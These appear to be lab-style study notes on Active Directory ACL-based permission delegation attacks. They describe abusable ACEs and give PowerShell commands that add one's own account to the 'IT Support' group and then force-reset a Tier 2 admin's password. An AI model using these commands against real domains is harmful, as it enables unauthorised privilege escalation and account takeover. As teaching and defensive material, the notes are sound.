Permission Delegation exploits are often referred to as ACL-based attacks. AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), hence the name ACL-based attacks. 
<br>

**ACEs:**
<br>
A significant amount of ACEs can be misconfigured, and the exploits for each vary. The Bloodhound documentation assists in explaining enumerated ACEs and how they can be exploited. However, we will look at a couple of notable ones here:

    ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
    AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
    GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
    GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
    WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
    WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object
    AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

After the recon we could find our account has some of these ACEs over the others that could have higher privilages in the AD environment.
![b75142b902297d318ca720f67015788f](https://github.com/user-attachments/assets/fae6a79b-6000-4db6-890b-6d8771b6b1c6)
In the screen above we could see domain users accounts have GenericWrite over the IT SUPPORT OU and this OU have the ForceChangePassword permission over the members of 2_ADMINS OU.<br>
To exploit this we will add our account from the domain users group to IT SUPPORT OU :
```
PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```
We can verify that the command worked by using the Get-ADGroupMember cmdlet:
```
PS C:\>Get-ADGroupMember -Identity "IT Support"
```

**ForceChangePassword**

Now that we are a member of the IT Support group, we have inherited the ForceChangePassword Permission Delegation over the Tier 2 Admins group.<br>
First, we need to identify the members of this group to select a target. We can use the Get-ADGroupMember cmdlet again to assist with this:
```
PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins"
```
Now we could choose any of these accounts to change their password:
```
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
```




























